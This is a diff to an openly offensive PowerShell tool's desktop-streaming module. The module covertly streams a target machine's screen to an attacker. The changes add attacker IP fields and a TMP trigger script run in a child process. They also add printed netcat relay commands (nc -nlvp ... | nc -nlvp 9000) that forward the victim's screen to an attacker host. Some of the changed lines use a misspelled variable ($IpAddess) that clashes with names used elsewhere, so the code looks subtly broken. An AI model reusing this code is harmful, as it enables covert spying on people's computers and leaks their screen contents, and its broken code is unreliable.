@@ -2823,14 +2823,16 @@ If($LiveStream -ne "false"){
       Stream desktop settings
       -----------------------
       Target   : 192.168.1.72
-      Stream   : Desktop
+      Attacker : 192.168.1.73
+      Stream   : Reverse
       BindPort : 1234
       Timmer   : 30 (sec)
 
       Creating trigger.ps1 to import \ run module on a diferent process! (child)
       Executing Start-Process to run module in a new powershell process! (child)
       -----------------------------------------------------------------------------
-      Start firefox on attacker side on: http://192.168.1.72:1234 to access stream!
+      Execute on attacker console: nc -nlvp 1234 | nc -nlvp 9000
+      Start firefox on attacker side on: http://192.168.1.73:9000 to access stream!
       -----------------------------------------------------------------------------
       Streaming remote target desktop for: 30 seconds!
       Stoping process Id: 12334 (LiveStream)
@@ -2892,7 +2894,7 @@ If($LiveStream -ne "false"){
 
       ## Start firefox to access streaming!
       Write-Host "-----------------------------------------------------------------------------"
-      Write-Host "Start firefox on attacker side on: http://127.0.0.1:${Port} to access stream!" -ForegroundColor Green
+      Write-Host "Start firefox on attacker side on: http://${Address}:${Port} to access stream!" -ForegroundColor Green
       Write-Host "-----------------------------------------------------------------------------";Start-Sleep -Milliseconds 500
       If($Timmer -eq 0)
       {
@@ -2961,7 +2963,7 @@ If($LiveStream -ne "false"){
       Write-Host "`nStream desktop settings" -ForegroundColor Green
       Write-Host "--------------------------"
       Write-Host "Target      : $Address"
-      Write-Host "Lhost       : $IPAddress"
+      Write-Host "Attacker    : $IpAddess"
       Write-Host "Stream      : Reverse"
       Write-Host "ReversePort : $Port"
       If($Timmer -eq 0)
@@ -2978,7 +2980,7 @@ If($LiveStream -ne "false"){
       ## Create trigger script to import\run module on a diferent process! (child)
       Write-Host "Creating trigger.ps1 to import \ run module on a diferent process! (child)"
       echo "Import-Module -Name `"$Env:TMP\Stream-TargetDesktop.ps1`" -EA SilentlyContinue -Force"|Out-File -FilePath "$Env:TMP\trigger.ps1" -Encoding ascii -Force
-      Add-Content $Env:TMP\trigger.ps1 "TargetScreen -Reverse -IPAddress $IPAddress -Port $Port"
+      Add-Content $Env:TMP\trigger.ps1 "TargetScreen -Reverse -IPAddress $Address -Port $Port"
 
       ## Run remote module in a new powershell process
       Write-Host "Executing Start-Process to run module in a new powershell process! (child)"
@@ -2987,7 +2989,8 @@ If($LiveStream -ne "false"){
 
       ## Start firefox to access streaming!
       Write-Host "-----------------------------------------------------------------------------"
-      Write-Host "Start firefox on attacker side on: http://${IPAddress}:${Port} to access stream!" -ForegroundColor Green
+      Write-Host "Execute on attacker console: nc -nlvp ${Port} | nc -nlvp 9000" -ForegroundColor Green
+      Write-Host "Start firefox on attacker side on: http://${IpAddess}:9000 to access stream!" -ForegroundColor Green
       Write-Host "-----------------------------------------------------------------------------";Start-Sleep -Milliseconds 500
       If($Timmer -eq 0)
       {
@@ -4894,7 +4897,7 @@ $HelpParameters = @"
       Stream desktop settings
       --------------------------
       Target      : 192.168.1.72
-      Lhost       : 192.168.1.71
+      Attacker    : 192.168.1.73
       Stream      : Reverse
       ReversePort : 4444
       Timmer      : 30 (sec)
@@ -4902,7 +4905,8 @@ $HelpParameters = @"
       Creating trigger.ps1 to import \ run module on a diferent process! (child)
       Executing Start-Process to run module in a new powershell process! (child)
       -----------------------------------------------------------------------------
-      Start firefox on attacker side on: http://192.168.1.71:4444 to access stream!
+      Execute on attacker console: nc -nlvp 4444 | nc -nlvp 9000
+      Start firefox on attacker side on: http://192.168.1.73:9000 to access stream!
       -----------------------------------------------------------------------------
       Streaming remote target desktop for: 30 seconds!
       Stoping process Id: 49392 (LiveStream)
